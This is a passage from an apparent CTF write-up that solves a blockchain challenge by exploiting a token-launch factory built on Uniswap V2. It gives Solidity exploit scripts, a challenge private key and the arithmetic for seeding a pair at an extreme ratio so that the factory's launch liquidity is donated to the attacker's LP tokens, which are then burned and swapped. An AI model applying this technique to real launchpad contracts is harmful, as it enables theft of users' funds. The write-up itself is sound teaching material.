</span></span><span class="line"><span class="cl">    <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;Reserve0 after mint:&#34;</span><span class="p">,</span> <span class="n">reserve0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;Reserve1 after mint:&#34;</span><span class="p">,</span> <span class="n">reserve1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// Print total supply of the pair
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">uint256</span> <span class="n">totalSupply</span> <span class="o">=</span> <span class="n">IERC20</span><span class="p">(</span><span class="n">pair</span><span class="p">).</span><span class="n">totalSupply</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;Pair total supply:&#34;</span><span class="p">,</span> <span class="n">totalSupply</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><div class="details admonition info open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-info-circle fa-fw" aria-hidden="true"></i>Glossary<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content"><p>token0 = GREY</p>
<p>token1 = MEME</p>
</div>
        </div>
    </div>
After creating the pair, let&rsquo;s manually calculate how many LP tokens we should receive and compare it with our script execution result later to better understand the process. Based on the script that we created before, we will send:
$$
\begin{align*}
\text{amountToken0} &amp;= 1 \\
\text{amountToken1} &amp;= 277777777777777777753086
\end{align*}
$$
If we send the above amounts when creating the pair, we will get:
$$
\begin{align*}
\text{lpTokens} &amp;= \sqrt{\text{amountToken0} \cdot \text{amountToken1}} - \text{minLiquidity} \\
&amp;= \sqrt{1 \cdot 277777777777777777753086} - 1000 \\
&amp;= 527046275694 \\\\
\text{totalSupply} &amp;= \text{lpTokens} + \text{lockedTokens} \\
&amp;= 527046275694 + 1000 \\
&amp;= 527046276694
\end{align*}
$$</p>
<p>Running this command shows that we successfully minted <code>lpTokens</code> and created an extreme ratio of <code>reserves</code> that exactly matches our calculations.
<img src="https://i.imgur.com/jMEdIUr.png"/></p>
<h5 id="launch-token-via-factory">Launch Token via Factory</h5>
<p>After initializing the pair with an extreme ratio, we will proceed to launch the token through the factory contract.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="p">[...]</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// Launch the MEME token
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">factory</span><span class="p">.</span><span class="n">launchToken</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">meme</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Log liquidity minted by factory through launch
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">uint256</span> <span class="n">pairLiquidity</span> <span class="o">=</span> <span class="n">IERC20</span><span class="p">(</span><span class="n">pair</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="mh">0xdEaD</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;Factory pair liquidity:&#34;</span><span class="p">,</span> <span class="n">pairLiquidity</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Log current reserves after launch
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">(</span><span class="n">reserve0</span><span class="p">,</span> <span class="n">reserve1</span><span class="p">,)</span> <span class="o">=</span> <span class="n">IUniswapV2Pair</span><span class="p">(</span><span class="n">pair</span><span class="p">).</span><span class="n">getReserves</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;Reserve0 after launch:&#34;</span><span class="p">,</span> <span class="n">reserve0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;Reserve1 after launch:&#34;</span><span class="p">,</span> <span class="n">reserve1</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>To explain in detail, when the <code>factory</code> launches the token, based on the <code>launchToken</code> code, it first adjusts the number of <code>GREY</code> and <code>MEME</code> tokens to maintain the price ratio. Here&rsquo;s how it calculates the burn amount:</p>
<p>$$
\begin{align*}
\text{burnAmount} &amp;= \frac{\text{virtualLiquidity} \cdot \text{tokenAmount}}{\text{reserveGREY}} \\
&amp;= \frac{2 \cdot 10^{18} \cdot 222222222222222222246914}{9 \cdot 10^{18} - 1} \\
&amp;= 49382716049382716060356
\end{align*}
$$</p>
<p>After burning tokens, the <code>factory</code> sends the following amounts of <code>MEME</code> and <code>GREY</code> tokens to the pair:
$$
\begin{align*}
\text{GREY} &amp;= 7 \cdot 10^{18} - 1 \\
\text{MEME} &amp;= 222222222222222222246914 - 49382716049382716060356 \\
&amp;= 172839506172839506186558
\end{align*}
$$</p>
<p>We can observe that the ratio of <code>GREY</code> and <code>MEME</code> tokens provided by the <code>factory</code> does not match the ratio in the existing pair that we created earlier. Let&rsquo;s manually calculate the amount of <code>lpTokens</code> that the <code>factory</code> will receive:</p>
<p>$$
\begin{align*}
\text{lpTokens} &amp;= \min\left(\frac{\text{amountToken0} \cdot \text{totalSupply}}{\text{reserve0}}, \frac{\text{amountToken1} \cdot \text{totalSupply}}{\text{reserve1}}\right) \\
&amp;= \min(\frac{(7 \cdot 10^{18} - 1) \cdot 527046276694}{1}, \frac{172839506172839506186558 \cdot 527046276694}{277777777777777777753086}) \\
&amp;= \min(3689323936857999999472953723306, 327939905498) \\
&amp;= 327939905498
\end{align*}
$$</p>
<p>As we can see, <code>launchToken</code> provides <strong>too much <code>GREY</code></strong> (because the LP tokens that the <code>factory</code> receives are calculated based on the <code>MEME</code> ratio rather than the <code>GREY</code> ratio). As a result, the excess <code>GREY</code> provided by the factory is effectively donated to our owned LP tokens, just as we described earlier.</p>
<p>When we run <code>launchToken</code>, we get results that match our calculations:</p>
<img src="https://i.imgur.com/W3cB6ZG.png"/>
<h5 id="burn-lp-tokens">Burn LP Tokens</h5>
<p>Now, let&rsquo;s manually calculate how many <code>GREY</code> and <code>MEME</code> tokens we would receive when burning our LP tokens after the launch:
$$
\begin{align*}
\text{amountGREY} &amp;= \frac{\text{liquidity} \cdot \text{balanceGREY}}{\text{totalSupply}} \\
&amp;= \frac{527046275694 \cdot 7 \cdot 10^{18}}{854986182192} \\
&amp;= 4315068484965885508 \\
&amp;\approx 4.315 \text{ ether} \\
\text{amountMEME} &amp;= \frac{\text{liquidity} \cdot \text{balanceMEME}}{\text{totalSupply}} \\
&amp;= \frac{527046275694 \cdot 450617283950617283939644}{854986182192} \\
&amp;= 277777777250890336939461
\end{align*}
$$
Our LP Token, which previously only represented $1$ $\text{wei}$ of <code>GREY</code>, now represents <code>4.315 ether</code> of <code>GREY</code>, and we still have approximately the same amount of <code>MEME</code> tokens. Let&rsquo;s update our code to burn all our LP tokens.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="p">[...]</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// Burn our LP tokens to receive underlying assets
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">IERC20</span><span class="p">(</span><span class="n">pair</span><span class="p">).</span><span class="nb">transfer</span><span class="p">(</span><span class="n">pair</span><span class="p">,</span> <span class="n">liquidity</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="kt">uint256</span> <span class="n">amount0</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">amount1</span><span class="p">)</span> <span class="o">=</span> <span class="n">IUniswapV2Pair</span><span class="p">(</span><span class="n">pair</span><span class="p">).</span><span class="n">burn</span><span class="p">(</span><span class="nb">sender</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;new balance of our GREY:&#34;</span><span class="p">,</span> <span class="n">amount0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;new balance of our MEME:&#34;</span><span class="p">,</span> <span class="n">amount1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Get and print reserves after burning
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">(</span><span class="n">reserve0</span><span class="p">,</span> <span class="n">reserve1</span><span class="p">,)</span> <span class="o">=</span> <span class="n">IUniswapV2Pair</span><span class="p">(</span><span class="n">pair</span><span class="p">).</span><span class="n">getReserves</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;Reserve0 after burn:&#34;</span><span class="p">,</span> <span class="n">reserve0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;Reserve1 after burn:&#34;</span><span class="p">,</span> <span class="n">reserve1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Running the script confirms that we receive exactly the calculated amounts of <code>GREY</code> and <code>MEME</code> tokens after burning our LP Tokens.</p>
<img src="https://i.imgur.com/RDXufz5.png"/>
<p>After burning our LP tokens, the new state of the trading pair becomes:
$$
\begin{align*}
\text{reserveGREY} &amp;= 2684931515034114492 \\
\text{reserveMEME} &amp;= 172839506699726947000183 \\
\end{align*}
$$</p>
<h5 id="swap-meme-to-grey-via-uniswap-v2-pair">Swap MEME to GREY via Uniswap V2 Pair</h5>
<p>Although we have obtained <code>4.315 ether</code> of <code>GREY</code> from burning our LP tokens, this amount is not enough to solve the challenge. However, we still have <code>MEME</code> tokens that we can swap through the Uniswap V2 Pair to get more <code>GREY</code>. You can read more details about swapping in this <a href="https://www.rareskills.io/post/uniswap-v2-price-impact" target="_blank" rel="noopener noreffer ">article</a>, but the basic rule is that the <code>pair</code> will only allow swaps that satisfy:
$$
\begin{align*}
k_{\text{before}} &amp;\leq k_{\text{after}} \\
r0_{\text{before}} \cdot r1_{\text{before}} &amp;\leq r0_{\text{after}} \cdot r1_{\text{after}} \\
\end{align*}
$$</p>
<p>Note that Uniswap V2 Pair charges a <code>0.3%</code> trading fee on the input amount, so we need to adjust the above formula accordingly.</p>
<p>When swapping all of our <code>MEME</code> tokens, the fee will be applied to our <code>MEME</code> token input. Let&rsquo;s calculate the maximum amount of <code>GREY</code> we can receive from this swap:</p>
<p>$$
\begin{align*}
r0_{\text{before}} \cdot r1_{\text{before}} &amp;\leq r0_{\text{after}} \cdot r1_{\text{after}} \\
\text{GREY} \cdot \text{MEME} &amp;\leq (\text{GREY} - \Delta\text{GREY}) \cdot (\text{MEME}+(\Delta\text{MEME}\cdot 0.997))  \\
\frac{\text{GREY} \cdot \text{MEME}}{\text{MEME}+(\Delta\text{MEME}\cdot0.997)} &amp;\leq (\text{GREY} - \Delta\text{GREY}) \\
\Delta\text{GREY} &amp;\leq \text{GREY} - \frac{\text{GREY} \cdot \text{MEME}}{\text{MEME}+(\Delta\text{MEME}\cdot0.997)} \\
\Delta\text{GREY} &amp;\leq 1653186745256232192 \approx 1.65\text{ ether} \\
\end{align*}
$$</p>
<p>By swapping all of our <code>MEME</code>, we can obtain <code>1.65 ether</code> of <code>GREY</code>. When combined with the <code>4.315 ether</code> we received from the previous burn, we will have a total of <code>5.965 ether</code> of <code>GREY</code>. This is exactly the minimum amount required to solve the challenge ðŸ™‚. After executing this <code>swap</code>, we will have successfully completed the challenge.</p>
<p>Let&rsquo;s update our script to perform the <code>swap</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="p">[...]</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// Swap all of our MEME token to 1.65 ether of GREY
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">uint256</span> <span class="n">memeBalance</span> <span class="o">=</span> <span class="n">meme</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="nb">sender</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">meme</span><span class="p">.</span><span class="nb">transfer</span><span class="p">(</span><span class="n">pair</span><span class="p">,</span> <span class="n">memeBalance</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">IUniswapV2Pair</span><span class="p">(</span><span class="n">pair</span><span class="p">).</span><span class="n">swap</span><span class="p">(</span><span class="mi">1</span><span class="p">.</span><span class="mi">65</span> <span class="kc">ether</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">sender</span><span class="p">,</span> <span class="s">&#34;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Now, we have fulfilled the solved condition
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;Final GREY balance after swap:&#34;</span><span class="p">,</span> <span class="n">grey</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="nb">sender</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;isSolved:&#34;</span><span class="p">,</span> <span class="n">setup</span><span class="p">.</span><span class="n">isSolved</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">    <span class="n">vm</span><span class="p">.</span><span class="n">stopBroadcast</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>After running the script, we will finally have enough <code>GREY</code> to solve the challenge, and the <code>isSolved</code> function will return <code>True</code>.</p>
<img src="https://i.imgur.com/FLdByGx.png"/>
<p>Below is the complete script I created to solve the challenge.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: UNLICENSED
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">13</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">Script</span><span class="p">,</span> <span class="n">console</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;forge-std/Script.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">Setup</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;/Users/chovid99/ctf-test/launchpad/dist-launchpad/Setup.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">GREY</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;/Users/chovid99/ctf-test/launchpad/dist-launchpad/lib/GREY.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">UniswapV2Factory</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;/Users/chovid99/ctf-test/launchpad/dist-launchpad/lib/v2-core/UniswapV2Factory.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">Factory</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;/Users/chovid99/ctf-test/launchpad/dist-launchpad/Factory.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">Token</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;/Users/chovid99/ctf-test/launchpad/dist-launchpad/Token.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">IUniswapV2Pair</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;/Users/chovid99/ctf-test/launchpad/dist-launchpad/lib/v2-core/interfaces/IUniswapV2Pair.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">IERC20</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;/Users/chovid99/ctf-test/launchpad/dist-launchpad/lib/v2-core/interfaces/IERC20.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">ExploitScript</span> <span class="k">is</span> <span class="n">Script</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">Setup</span> <span class="k">public</span> <span class="n">setup</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">GREY</span> <span class="k">public</span> <span class="n">grey</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">UniswapV2Factory</span> <span class="k">public</span> <span class="n">uniswapV2Factory</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">Factory</span> <span class="k">public</span> <span class="n">factory</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">Token</span> <span class="k">public</span> <span class="n">meme</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">setUp</span><span class="p">()</span> <span class="k">public</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kt">string</span> <span class="k">memory</span> <span class="n">rpc</span> <span class="o">=</span> <span class="s">&#34;http://challs2.nusgreyhats.org:33502/0b3164f8-2adc-465a-9743-61c1517b2e9a&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">privateKey</span> <span class="o">=</span> <span class="mh">0xd41bcc5d73608ffa85c1bada6c8a7a52fb050f03d17d139c2db146de078d95a5</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="n">setupAddress</span> <span class="o">=</span> <span class="mh">0xbE49C81C4D7A188e3C24043556d78C3dC61fc3BE</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="nb">sender</span> <span class="o">=</span> <span class="n">vm</span><span class="p">.</span><span class="n">addr</span><span class="p">(</span><span class="n">privateKey</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// Connect to network
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">vm</span><span class="p">.</span><span class="n">createSelectFork</span><span class="p">(</span><span class="n">rpc</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="c1">// Set up contracts
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">setup</span> <span class="o">=</span> <span class="n">Setup</span><span class="p">(</span><span class="n">setupAddress</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">grey</span> <span class="o">=</span> <span class="n">GREY</span><span class="p">(</span><span class="n">setup</span><span class="p">.</span><span class="n">grey</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">        <span class="n">uniswapV2Factory</span> <span class="o">=</span> <span class="n">UniswapV2Factory</span><span class="p">(</span><span class="n">setup</span><span class="p">.</span><span class="n">uniswapV2Factory</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">        <span class="n">factory</span> <span class="o">=</span> <span class="n">Factory</span><span class="p">(</span><span class="n">setup</span><span class="p">.</span><span class="n">factory</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">        <span class="n">meme</span> <span class="o">=</span> <span class="n">Token</span><span class="p">(</span><span class="n">setup</span><span class="p">.</span><span class="n">meme</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">            START EXPLOIT
</span></span></span><span class="line"><span class="cl"><span class="cm">        */</span>
</span></span><span class="line"><span class="cl">        <span class="n">vm</span><span class="p">.</span><span class="n">startBroadcast</span><span class="p">(</span><span class="n">privateKey</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// Claim initial GREY tokens (5 ether)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">setup</span><span class="p">.</span><span class="n">claim</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// Buy MEME tokens 5 ether - 1
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">grey</span><span class="p">.</span><span class="n">approve</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">factory</span><span class="p">),</span> <span class="mi">5</span> <span class="kc">ether</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">factory</span><span class="p">.</span><span class="n">buyTokens</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">meme</span><span class="p">),</span> <span class="mi">5</span> <span class="kc">ether</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// Print MEME balance and factory reserves
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;MEME balance after buy:&#34;</span><span class="p">,</span> <span class="n">meme</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="nb">sender</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="n">Factory</span><span class="p">.</span><span class="n">Pair</span> <span class="k">memory</span> <span class="n">factoryPair</span> <span class="o">=</span> <span class="n">factory</span><span class="p">.</span><span class="n">pairs</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">meme</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;Factory reserveGREY:&#34;</span><span class="p">,</span> <span class="n">factoryPair</span><span class="p">.</span><span class="n">reserveGREY</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;Factory reserveToken:&#34;</span><span class="p">,</span> <span class="n">factoryPair</span><span class="p">.</span><span class="n">reserveToken</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">console</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;Factory virtualLiquidity:&#34;</span><span class="p">,</span> <span class="n">factoryPair</span><span class="p">.</span><span class="n">virtualLiquidity</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// Create pair directly and setup initial liquidity of 1 wei GREY and ALL MEME tokens that we had
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">address</span> <span class="n">pair</span> <span class="o">=</span> <span class="n">uniswapV2Factory</span><span class="p">.</span><span class="n">createPair</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">grey</span><span class="p">),</span> <span class="kt">address</span><span class="p">(</span><span class="n">meme</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="n">grey</span><span class="p">.</span><span class="nb">transfer</span><span class="p">(</span><span class="n">pair</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">meme</span><span class="p">.</span><span class="nb">transfer</span><span class="p">(</span><span class="n">pair</span><span class="p">,</span> <span class="n">meme</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="nb">sender</span><span class="p">));</span>
